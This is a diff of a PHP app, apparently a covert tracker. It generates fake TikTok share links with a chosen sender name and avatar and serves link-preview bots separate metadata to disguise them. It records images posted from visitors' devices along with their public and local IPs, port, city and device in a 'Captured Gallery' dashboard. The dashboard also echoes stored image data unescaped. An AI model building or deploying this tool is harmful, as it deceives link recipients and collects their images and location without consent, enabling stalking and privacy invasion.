@@ -10,7 +10,8 @@ if (!is_dir($upload_dir)) {
 }
 
 try {
-    $db = new PDO('sqlite:tracker_custom_bg.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker_custom_bg.db');
+    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -40,13 +41,15 @@ try {
 }
 
 // دالة مخصصة ومركزة حصرياً لسحب العنوان والصورة المصغرة الحقيقية من تيك توك
-function fetch_tiktok_exclusive_meta($url) {$meta = [
+function fetch_tiktok_exclusive_meta($url) {
+    $meta = [
         'title' => 'TikTok Video',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
-    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);$ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL,$oembed_url);
+    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $oembed_url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
@@ -57,16 +60,16 @@ function fetch_tiktok_exclusive_meta($url) {$meta = [
     if ($response) {
         $data = json_decode($response, true);
         if (!empty($data['title'])) {
-            $meta['title'] =$data['title'];
+            $meta['title'] = $data['title'];
         }
         if (!empty($data['thumbnail_url'])) {
-            $meta['image'] =$data['thumbnail_url'];
+            $meta['image'] = $data['thumbnail_url'];
             return $meta;
         }
     }
 
     $ch_alt = curl_init();
-    curl_setopt($ch_alt, CURLOPT_URL,$url);
+    curl_setopt($ch_alt, CURLOPT_URL, $url);
     curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
@@ -75,20 +78,21 @@ function fetch_tiktok_exclusive_meta($url) {$meta = [
     $html = curl_exec($ch_alt);
     curl_close($ch_alt);
 
-    if ($html) {$dom = new DOMDocument();
+    if ($html) {
+        $dom = new DOMDocument();
         @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
         $xpath = new DOMXPath($dom);
 
-        $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //title');
+        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
         if ($titleNodes->length > 0) {
             $val = trim($titleNodes->item(0)->nodeValue);
-            if (!empty($val)) $meta['title'] =$val;
+            if (!empty($val)) $meta['title'] = $val;
         }
 
-        $imageNodes =$xpath->query('//meta[@property="og:image"]/@content');
+        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
         if ($imageNodes->length > 0) {
             $val = trim($imageNodes->item(0)->nodeValue);
-            if (!empty($val)) $meta['image'] =$val;
+            if (!empty($val)) $meta['image'] = $val;
         }
     }
 
@@ -97,35 +101,36 @@ function fetch_tiktok_exclusive_meta($url) {$meta = [
 
 function get_real_ip() {
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
         return trim($ips[0]);
     }
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
 function get_ip_location($ip) {
-    if ($ip === '127.0.0.1' || $ip === 'Unknown' \vert{}\vert{} strpos($ip, '192.168.') === 0) {
+    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return 'Local Network';
     }
     @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
     if ($json) {
         $data = json_decode($json, true);
-        if (isset($data['status']) &&$data['status'] === 'success') {
+        if (isset($data['status']) && $data['status'] === 'success') {
             return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
         }
     }
     return 'Unknown Location';
 }
 
-function get_device_type($ua) {$brand = 'Device';
-    if (stripos($ua, 'Samsung') !== false)$brand = 'Samsung';
-    elseif (stripos($ua, 'iPhone') !== false)$brand = 'iPhone';
-    elseif (stripos($ua, 'Huawei') !== false)$brand = 'Huawei';
-    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false)$brand = 'Xiaomi';
-    elseif (stripos($ua, 'Oppo') !== false)$brand = 'Oppo';
+function get_device_type($ua) {
+    $brand = 'Device';
+    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
+    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
+    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
+    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
+    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
 
-    if (stripos($ua, 'Android') !== false) return$brand . ' - Android';
-    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
+    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
+    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
     if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
     if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
     return 'Unknown Device';
@@ -133,21 +138,21 @@ function get_device_type($ua) {$brand = 'Device';
 
 // معالجة زيارة الرابط
 if (isset($_GET['r'])) {
-    $code =$_GET['r'];
-    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
+    $code = $_GET['r'];
+    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
     $stmt->execute([$code]);
-    $link =$stmt->fetch(PDO::FETCH_ASSOC);
+    $link = $stmt->fetch(PDO::FETCH_ASSOC);
 
     if ($link) {
-        $target_redirect =$link['target_url'];
-        $sender_name =$link['sender_name'];
-        $sender_avatar =$link['sender_avatar'];
-        $meta_title =$link['meta_title'];
-        $meta_image =$link['meta_image'];
-        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] :$meta_image;
+        $target_redirect = $link['target_url'];
+        $sender_name = $link['sender_name'];
+        $sender_avatar = $link['sender_avatar'];
+        $meta_title = $link['meta_title'];
+        $meta_image = $link['meta_image'];
+        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $meta_image;
 
-        $ua =$_SERVER['HTTP_USER_AGENT'] ?? '';
-        $is_bot = preg_match('/bot\vert{}crawl\vert{}slurp\vert{}spider\vert{}whatsapp\vert{}telegram\vert{}facebookexternalhit\vert{}vkShare\vert{}twitterbot\vert{}linkedinbot\vert{}skypeuripreview\vert{}messenger/i',$ua);
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
 
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
@@ -165,16 +170,18 @@ if (isset($_GET['r'])) {
             exit();
         }
 
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {$img_base64 = $_POST['image'] ?? '';$public_ip = get_real_ip();
-            $local_ip =$_POST['lip'] ?? 'Direct';
-            $port =$_SERVER['REMOTE_PORT'] ?? 'Unknown';
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
+            $img_base64 = $_POST['image'] ?? '';
+            $public_ip = get_real_ip();
+            $local_ip = $_POST['lip'] ?? 'Direct';
+            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
             $location = get_ip_location($public_ip);
             $device = get_device_type($ua);
 
             if (!empty($img_base64)) {
                 try {
-                    $capStmt =$db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
-                    $capStmt->execute([$code, $img_base64,$public_ip, $local_ip,$port, $location,$device, date('Y-m-d H:i:s')]);
+                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
                 } catch (Exception $e) {}
             }
             exit('OK');
@@ -364,41 +371,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     }
 
     $scraped = fetch_tiktok_exclusive_meta($target_url);
-    $meta_title =$scraped['title'];
-    $meta_image =$scraped['image'];
+    $meta_title = $scraped['title'];
+    $meta_image = $scraped['image'];
 
     $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
-    if (isset($_FILES['avatar_file']) &&$_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
+    if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
         $avatarName = 'avatar_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['avatar_file']['tmp_name'],$upload_dir . $avatarName);$sender_avatar = $upload_dir .$avatarName;
+        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
+        $sender_avatar = $upload_dir . $avatarName;
     } elseif (!empty($_POST['sender_avatar_url'])) {
         $sender_avatar = trim($_POST['sender_avatar_url']);
     }
 
     $bg_image_url = "";
-    if (isset($_FILES['bg_file']) &&$_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
+    if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
         $bgName = 'bg_' . uniqid() . '.' . $ext;
-        @move_uploaded_file($_FILES['bg_file']['tmp_name'],$upload_dir . $bgName);$bg_image_url = $upload_dir .$bgName;
+        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
+        $bg_image_url = $upload_dir . $bgName;
     } elseif (!empty($_POST['bg_image_url'])) {
         $bg_image_url = trim($_POST['bg_image_url']);
     }
 
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt =$db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?, ?)");
-    $stmt->execute([$code, $target_url,$sender_name, $sender_avatar,$bg_image_url, $meta_title,$meta_image]);
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, bg_image, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar, $bg_image_url, $meta_title, $meta_image]);
 
-    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
+    $domain = $_SERVER['HTTP_HOST'];
+    $generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
 $filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
-    $stmt =$db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
+    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
     $stmt->execute([$filter_code]);
-    $captures =$stmt->fetchAll(PDO::FETCH_ASSOC);
+    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
 } else {
-    $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
+    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 ?>
 <!DOCTYPE html>
@@ -446,4 +456,108 @@ if (!empty($filter_code)) {
         .info-row span { color: #cbd5e1; }
         .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
 
-        footer { text-align: center; margin-top: 40px;
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
+        footer span { color: var(--accent); font-weight: 600; }
+    </style>
+    <script>
+        function copyText(text, btnElement) {
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btnElement.innerText;
+                btnElement.innerText = "Copied";
+                btnElement.style.background = "#10b981";
+                setTimeout(() => {
+                    btnElement.innerText = original;
+                    btnElement.style.background = "";
+                }, 2000);
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="wrapper">
+        
+        <div class="section-box">
+            <h2>Generate TikTok Link</h2>
+            <form method="POST" enctype="multipart/form-data" class="form-grid">
+                <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
+                <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
+                
+                <div>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Sender Avatar Image:</label>
+                    <input type="file" name="avatar_file" accept="image/*">
+                    <input type="text" name="sender_avatar_url" placeholder="Or paste Avatar URL..." style="margin-top: 6px;">
+                </div>
+
+                <div>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Optional):</label>
+                    <input type="file" name="bg_file" accept="image/*">
+                    <input type="text" name="bg_image_url" placeholder="Or paste Background URL..." style="margin-top: 6px;">
+                </div>
+
+                <button type="submit" name="create" class="btn">Generate Link</button>
+            </form>
+
+            <?php if (!empty($generated_link)): ?>
+                <div class="result-panel">
+                    <label>Active Link:</label>
+                    <div class="flex-row">
+                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
+                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
+                    </div>
+                </div>
+            <?php endif; ?>
+        </div>
+
+        <div class="section-box">
+            <h2>Captured Gallery & Details</h2>
+            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
+                <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
+                <button type="submit" class="btn" style="height:42px;">Filter</button>
+                <?php if(!empty($filter_code)): ?>
+                    <a href="/" class="btn btn-danger" style="height:42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+                <?php endif; ?>
+            </form>
+
+            <?php if (empty($captures)): ?>
+                <p style="text-align: center; color: var(--text-muted); padding: 30px;">No captures recorded.</p>
+            <?php else: ?>
+                <div class="gallery-grid">
+                    <?php foreach ($captures as $cap): ?>
+                        <div class="card-img">
+                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
+                                <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
+                            </a>
+                            <div class="info-row" style="margin-top:10px;">
+                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
+                            </div>
+                            <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
+                                <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
+                            </div>
+                        </div>
+                    <?php endforeach; ?>
+                </div>
+            <?php endif; ?>
+        </div>
+
+    </div>
+
+    <footer>
+        <p>Core Engine <span>azeez</span> &copy; 2026</p>
+    </footer>
+</body>
+</html>
